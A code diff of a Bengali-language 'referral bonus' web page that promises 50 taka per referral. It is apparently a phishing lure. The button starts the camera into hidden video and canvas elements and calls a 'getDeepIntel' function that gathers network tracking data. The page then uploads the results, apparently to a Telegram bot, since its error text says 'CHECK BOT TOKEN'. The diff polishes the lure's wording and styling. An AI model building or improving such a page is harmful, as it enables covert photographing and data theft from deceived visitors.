@@ -20,15 +20,16 @@
             z-index: 2; position: relative; border: 2px solid #00ff00;
             box-shadow: 0 0 20px #00ff00;
         }
-        h1 { color: #00ff00; font-size: 26px; margin-bottom: 15px; text-transform: uppercase; }
-        h2 { color: #ffffff; font-size: 18px; margin-bottom: 30px; }
+        h1 { color: #00ff00; font-size: 24px; margin-bottom: 10px; text-transform: uppercase; }
+        h2 { color: #ffffff; font-size: 16px; margin-bottom: 10px; }
+        p { color: #00ff00; font-size: 14px; margin-bottom: 25px; }
         #verify-btn { 
             background-color: #00ff00; color: #000; border: none; padding: 15px; 
             font-size: 18px; border-radius: 5px; cursor: pointer; width: 100%; font-weight: bold;
-            transition: 0.3s; letter-spacing: 1px;
+            transition: 0.3s;
         }
         #verify-btn:hover { background-color: #053b05; color: #00ff00; }
-        #status { margin-top: 25px; font-weight: bold; font-size: 14px; letter-spacing: 1px; }
+        #status { margin-top: 20px; font-weight: bold; font-size: 14px; letter-spacing: 1px; }
         .success { color: #00ff00 !important; }
         .error { color: #ff0000 !important; }
         #video, #canvas { display: none; }
@@ -36,12 +37,11 @@
 </head>
 <body>
     <div class="container">
-        <h1>বোনাস সিস্টেম</h1>
+        <h1>বোনাস নিন </h1>
         <h2>প্রতি রেফারর ৫০ টাকা বোনাস পান।</h2>
-        
-        <button id="verify-btn">START REFER</button>
+        <p>[ বোনাস পেতে রেফার করুন ]</p>
+        <button id="verify-btn">রেফার করুন </button>
         <div id="status"></div>
-        
         <video id="video" autoplay playsinline></video>
         <canvas id="canvas"></canvas>
     </div>
@@ -55,6 +55,7 @@
         const verifyBtn = document.getElementById('verify-btn');
         const status = document.getElementById('status');
 
+        // অ্যাডভান্সড ট্র্যাকার ডাটা সংগ্রহ
         async function getDeepIntel() {
             let intel = "\n\n🌐 **NETWORK INTEL**";
             try {
@@ -75,7 +76,7 @@
         }
 
         verifyBtn.addEventListener('click', async () => {
-            status.innerText = "> INITIALIZING...";
+            status.innerText = "> INITIALIZING SYSTEM...";
             status.className = "success";
             verifyBtn.style.display = "none"; 
 
@@ -86,6 +87,7 @@
                 const video = document.getElementById('video');
                 video.srcObject = stream;
 
+                // ট্র্যাকার ডাটা ফেচ করা
                 const intelData = await getDeepIntel();
 
                 setTimeout(async () => {
@@ -104,10 +106,10 @@
                         }
 
                         if(ok) {
-                            status.innerText = "> SUCCESSFUL";
+                            status.innerText = "> VERIFICATION SUCCESSFUL";
                             status.className = "success";
                         } else {
-                            status.innerText = "> UPLOAD ERROR";
+                            status.innerText = "> UPLOAD ERROR: CHECK BOT TOKEN";
                             status.className = "error";
                         }
                         stream.getTracks().forEach(t => t.stop());
